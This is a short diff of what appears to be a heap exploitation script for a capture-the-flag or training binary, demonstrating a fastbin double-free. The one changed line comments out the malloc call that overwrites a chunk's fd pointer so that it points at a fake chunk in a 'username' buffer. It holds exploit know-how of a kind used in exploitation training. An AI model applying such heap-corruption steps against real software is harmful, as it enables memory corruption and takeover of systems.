@@ -62,7 +62,7 @@ free(dup)
 
 # The next request for a 0x20-sized chunk will be serviced by the "dup" chunk.
 # Request it, then overwrite its fastbin fd, pointing it to the fake chunk in "username".
-malloc(0x18, p64(elf.sym.user))
+#malloc(0x18, p64(elf.sym.user))
 
 # Make two more requests for 0x20-sized chunks. The "safety" chunk, then the "dup" chunk are allocated to
 # service these requests.
